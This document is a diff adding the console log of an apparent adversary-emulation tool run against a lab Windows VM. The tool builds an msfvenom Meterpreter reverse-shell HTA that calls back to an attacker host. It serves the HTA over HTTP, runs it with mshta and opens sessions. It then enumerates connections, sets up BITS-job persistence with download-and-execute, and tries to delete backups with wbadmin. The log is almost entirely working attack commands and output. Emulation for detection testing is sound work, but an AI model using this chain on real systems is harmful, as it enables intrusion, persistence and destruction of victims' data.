@@ -1,0 +1,381 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260713T163756Z-78114f34/chain-004]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[MSFVenom Console] Step 1
+
+📌[Name] Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacker machine
+➤ Enter value for LPORT (current: 4444 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.hta' , required: True): 
+
+[MSFVenom] Command to run:
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.43 LPORT=4444 -f hta-psh -o /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.hta
+Run this MSFVenom command? [y/n] (y): 
+[MSFVenom] Running... (may take 5-10s)
+✓ MSFVenom payload generated successfully
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_mp.hta' , required: True): 
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On attacker's machine)                                                                │
+│ python -m http.server 8000                                                             │
+│                                                                                        │
+│ (On victim's machine)                                                                  │
+│ 1. Open 192.168.56.43:8000 in the browser                                              │
+│ 2. Navigate to the path of the file on the attacker's machine                          │
+│ 3. Download the file to C:\Users\Public\chain_mp.hta                                   │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Metasploit Executor] Step 3
+
+📌[Name] Set an MSF payload handler for a file-backed payload
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: False): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 4444 , required: False): 
+ Parameter Input
+  Parameter: payload_name
+  Description: payload type set by msf
+➤ Enter value for payload_name (current: 'windows/meterpreter/reverse_tcp' , required: False): 
+[*] Executing exploit=exploit/multi/handler payload=windows/meterpreter/reverse_tcp
+[+] Handler active — job 25: Exploit: multi/handler
+✓ Handler active — job 25, awaiting callback
+No active sessions found after 20s.
+
+📌[Human] Step 4
+
+📌[Name] Simulate the victim execute an HTA file on its machine
+  ✓ Using stored value: C:\Users\Public\chain_mp.hta
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, use PowerShell or Command Prompt, or the Run dialog)             │
+│ mshta.exe C:\Users\Public\chain_mp.hta                                                 │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 5
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [126] meterpreter — AR-WIN-2\vagrant @ AR-WIN-2 (192.168.56.15:49755)
+➤ Session id to accept (default: 126, or 'n' to abort chain): 
+
+📌[Meterpreter Executor] Step 6
+
+📌[Name] Network Connection Enumeration
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[126] AR-WIN-2\vagrant @ AR-WIN-2
+Select session ID: 126
+Set the default session id as: 126!
+Selected meterpreter session: 126
+
+[Meterpreter Executor] Executing: netstat
+Keep going with the next attack step? [y/n] (y): 
+
+Connection list
+===============
+
+    Proto  Local address        Remote address       State        User  Inode  PID/Program name
+    -----  -------------        --------------       -----        ----  -----  ----------------
+    tcp    0.0.0.0:135          0.0.0.0:*            LISTEN       0     0      652/svchost.exe
+    tcp    0.0.0.0:445          0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    0.0.0.0:3389         0.0.0.0:*            LISTEN       0     0      876/svchost.exe
+    tcp    0.0.0.0:5985         0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    0.0.0.0:47001        0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    0.0.0.0:49664        0.0.0.0:*            LISTEN       0     0      416/wininit.exe
+    tcp    0.0.0.0:49665        0.0.0.0:*            LISTEN       0     0      992/svchost.exe
+    tcp    0.0.0.0:49666        0.0.0.0:*            LISTEN       0     0      432/svchost.exe
+    tcp    0.0.0.0:49667        0.0.0.0:*            LISTEN       0     0      1644/spoolsv.exe
+    tcp    0.0.0.0:49668        0.0.0.0:*            LISTEN       0     0      532/services.exe
+    tcp    0.0.0.0:49680        0.0.0.0:*            LISTEN       0     0      540/lsass.exe
+    tcp    10.0.2.15:139        0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    10.0.2.15:49670      20.190.157.9:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49671      146.75.82.172:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49673      172.183.7.192:443    ESTABLISHED  0     0      432/svchost.exe
+    tcp    10.0.2.15:49674      48.211.4.16:443      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49681      20.190.157.9:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49682      172.183.7.192:443    ESTABLISHED  0     0      2856/explorer.exe
+    tcp    10.0.2.15:49684      4.150.223.102:443    TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49685      172.183.7.192:443    ESTABLISHED  0     0      432/svchost.exe
+    tcp    10.0.2.15:49687      172.183.7.192:443    ESTABLISHED  0     0      2856/explorer.exe
+    tcp    10.0.2.15:49690      23.11.33.159:80      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49700      13.225.47.3:443      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49701      13.225.47.3:443      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49704      150.171.28.10:443    TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49705      150.171.28.10:443    TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49706      104.18.38.233:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49707      172.64.149.23:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49708      104.18.38.233:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49709      104.18.38.233:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49710      4.150.223.98:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49711      4.150.223.98:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49738      150.171.109.178:443  TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49739      23.63.186.191:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49740      23.63.186.191:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49743      23.63.186.191:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49744      23.63.186.191:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49747      23.14.141.118:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49748      146.75.82.172:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.0.2.15:49749      150.171.28.10:443    ESTABLISHED  0     0      3748/iexplore.exe
+    tcp    10.0.2.15:49750      150.171.28.10:443    ESTABLISHED  0     0      3748/iexplore.exe
+    tcp    10.0.2.15:49752      23.63.186.191:443    ESTABLISHED  0     0      3748/iexplore.exe
+    tcp    10.0.2.15:49753      85.210.196.11:443    TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.56.15:139    0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    192.168.56.15:49755  192.168.56.43:4444   ESTABLISHED  0     0      2272/powershell.exe
+    tcp6   :::135               :::*                 LISTEN       0     0      652/svchost.exe
+    tcp6   :::445               :::*                 LISTEN       0     0      4/System
+    tcp6   :::3389              :::*                 LISTEN       0     0      876/svchost.exe
+    tcp6   :::5985              :::*                 LISTEN       0     0      4/System
+    tcp6   :::47001             :::*                 LISTEN       0     0      4/System
+    tcp6   :::49664             :::*                 LISTEN       0     0      416/wininit.exe
+    tcp6   :::49665             :::*                 LISTEN       0     0      992/svchost.exe
+    tcp6   :::49666             :::*                 LISTEN       0     0      432/svchost.exe
+    tcp6   :::49667             :::*                 LISTEN       0     0      1644/spoolsv.exe
+    tcp6   :::49668             :::*                 LISTEN       0     0      532/services.exe
+    tcp6   :::49680             :::*                 LISTEN       0     0      540/lsass.exe
+    udp    0.0.0.0:123          0.0.0.0:*                         0     0      204/svchost.exe
+    udp    0.0.0.0:3389         0.0.0.0:*                         0     0      876/svchost.exe
+    udp    0.0.0.0:5050         0.0.0.0:*                         0     0      204/svchost.exe
+    udp    0.0.0.0:5353         0.0.0.0:*                         0     0      1048/svchost.exe
+    udp    0.0.0.0:5355         0.0.0.0:*                         0     0      1048/svchost.exe
+    udp    10.0.2.15:137        0.0.0.0:*                         0     0      4/System
+    udp    10.0.2.15:138        0.0.0.0:*                         0     0      4/System
+    udp    127.0.0.1:62074      0.0.0.0:*                         0     0      432/svchost.exe
+    udp    192.168.56.15:137    0.0.0.0:*                         0     0      4/System
+    udp    192.168.56.15:138    0.0.0.0:*                         0     0      4/System
+    udp6   :::123               :::*                              0     0      204/svchost.exe
+    udp6   :::3389              :::*                              0     0      876/svchost.exe
+    udp6   :::5353              :::*                              0     0      1048/svchost.exe
+    udp6   :::5355              :::*                              0     0      1048/svchost.exe
+
+
+
+📌[Human] Step 7
+
+📌[Name] Simulate the victim execute an HTA file on its machine as Admin
+  ✓ Using stored value: C:\Users\Public\chain_mp.hta
+
+⚠ Human action required:
+╭───────────────────────────────────── Manual Step ──────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically) │
+│ (On victim's machine, open an ELEVATED PowerShell or Command Prompt)                   │
+│ mshta.exe C:\Users\Public\chain_mp.hta                                                 │
+│                                                                                        │
+╰────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 8
+📌[Name] Execute a Meterpreter Payload
+[Session Check] Polling for new meterpreter session (30s)…
+  Previously known sessions: ['126']
+  Newly detected session(s):
+    [127] meterpreter — AR-WIN-2\vagrant @ AR-WIN-2 (192.168.56.15:49757)
+➤ Session id to accept (default: 127, or 'n' to abort chain): 
+
+📌[Meterpreter Session Derive] Step 9
+📌[Name] Execute System Command
+ Parameter Input
+  Parameter: executor
+  Description: The Meterpreter session ID of the active Metasploit connection.
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[126] AR-WIN-2\vagrant @ AR-WIN-2
+[127] AR-WIN-2\vagrant @ AR-WIN-2
+Select session ID: 127
+Set the default session id as: 127!
+Selected meterpreter session: 127
+  ↳ Derived executor_derived executor from Meterpreter session 127
+
+📌[Command Prompt Executor] Step 10
+
+📌[Name] Persist, Download, & Execute
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke bitsadmin.
+  ✓ Using stored value: 127
+ Parameter Input
+  Parameter: bits_job_name
+  Description: BITS job name.
+➤ Enter value for bits_job_name (current: 'AtomicBITS' , required: True): 
+ Parameter Input
+  Parameter: remote_file
+  Description: URL of a file for BITS to download (payload delivery vehicle).
+➤ Enter value for remote_file (current: 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md' , required: True): 
+ Parameter Input
+  Parameter: local_file
+  Description: Target-side destination for the BITS download.
+➤ Enter value for local_file (current: 'C:\\Users\\Public\\bits_download.dat' , required: True): 
+ Parameter Input
+  Parameter: command_path
+  Description: Command invoked via `/setnotifycmdline` on BITS state change.
+➤ Enter value for command_path (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  bitsadmin.exe /create "AtomicBITS"
+bitsadmin.exe /addfile "AtomicBITS" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md" 
+"C:\Users\Public\bits_download.dat"
+bitsadmin.exe /setnotifycmdline "AtomicBITS" "C:\Windows\System32\notepad.exe" NULL
+bitsadmin.exe /resume "AtomicBITS"
+ping -n 5 127.0.0.1 >nul 2>&1
+bitsadmin.exe /complete "AtomicBITS"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: bitsadmin.exe /create "AtomicBITS"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Created job {E58DE49F-C727-4D4F-824A-2BB0BD8C9D35}.
+
+Executing: bitsadmin.exe /addfile "AtomicBITS" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md" "C:\Users\Public\bits_download.dat"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Added https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -> C:\Users\Public\bits_download.dat to job.
+
+Executing: bitsadmin.exe /setnotifycmdline "AtomicBITS" "C:\Windows\System32\notepad.exe" NULL
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+notification command line set to 'C:\Windows\System32\notepad.exe' 'NULL'.
+
+Executing: bitsadmin.exe /resume "AtomicBITS"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Job resumed.
+
+Executing: ping -n 5 127.0.0.1 >nul 2>&1
+Output: (empty)
+
+Executing: bitsadmin.exe /complete "AtomicBITS"
+Output:
+BITSADMIN version 3.0
+BITS administration utility.
+(C) Copyright 2000-2006 Microsoft Corp.
+
+BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
+Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.
+
+Job completed.
+
+
+📌[Command Prompt Executor] Step 11
+
+📌[Name] Windows - wbadmin Delete Windows Backup Catalog
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke wbadmin.
+  ✓ Using stored value: 127
+
+[Command Prompt Executor] Command to run via Meterpreter:
+  wbadmin delete catalog -quiet
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+Executing: wbadmin delete catalog -quiet
+Output:
+'wbadmin' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 11 failed: Windows - wbadmin Delete Windows Backup Catalog
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1/1 command(s) failed in meterpreter shell channel:
+  [1] 'wbadmin delete catalog -quiet': cmd exit code 9009
+      'wbadmin' is not recognized as an internal or external command,
+      operable program or batch file.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                                  Start                    End                      Duration  Status
+   1  Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using    2026-07-14 15:25:29 UTC  2026-07-14 15:25:39 UTC      9.8s    ✓   
+      MSFVenom                                                                                                                                                
+   2  Simulate the victim download a file on its machine                                    2026-07-14 15:25:39 UTC  2026-07-14 15:26:42 UTC     1m 2s    ✓   
+   3  Set an MSF payload handler for a file-backed payload                                  2026-07-14 15:26:42 UTC  2026-07-14 15:27:16 UTC     34.4s    ✓   
+   4  Simulate the victim execute an HTA file on its machine                                2026-07-14 15:27:16 UTC  2026-07-14 15:28:14 UTC     57.9s    ✓   
+   5  Execute a Meterpreter Payload                                                         2026-07-14 15:28:14 UTC  2026-07-14 15:28:16 UTC      1.9s    ✓   
+   6  Network Connection Enumeration                                                        2026-07-14 15:28:16 UTC  2026-07-14 15:28:21 UTC      5.3s    ✓   
+   7  Simulate the victim execute an HTA file on its machine as Admin                       2026-07-14 15:28:21 UTC  2026-07-14 15:29:27 UTC     1m 6s    ✓   
+   8  Execute a Meterpreter Payload                                                         2026-07-14 15:29:27 UTC  2026-07-14 15:29:30 UTC      2.5s    ✓   
+   9  Execute System Command                                                                2026-07-14 15:29:30 UTC  2026-07-14 15:29:40 UTC      9.5s    ✓   
+  10  Persist, Download, & Execute                                                          2026-07-14 15:29:40 UTC  2026-07-14 15:30:02 UTC     22.7s    ✓   
+  11  Windows - wbadmin Delete Windows Backup Catalog                                       2026-07-14 15:30:02 UTC  2026-07-14 15:30:11 UTC      9.1s    ✗   
+
+  Failed steps (1):
+  ✗ Step 11: Windows - wbadmin Delete Windows Backup Catalog
+      1/1 command(s) failed in meterpreter shell channel:
+        [1] 'wbadmin delete catalog -quiet': cmd exit code 9009
+            'wbadmin' is not recognized as an internal or external command,
+            operable program or batch file.
+
+  Total: 11 steps executed (10 ✓, 0 ?, 1 ✗) in 4m 42s
+══════════════════════════════════════════════════════════════════════
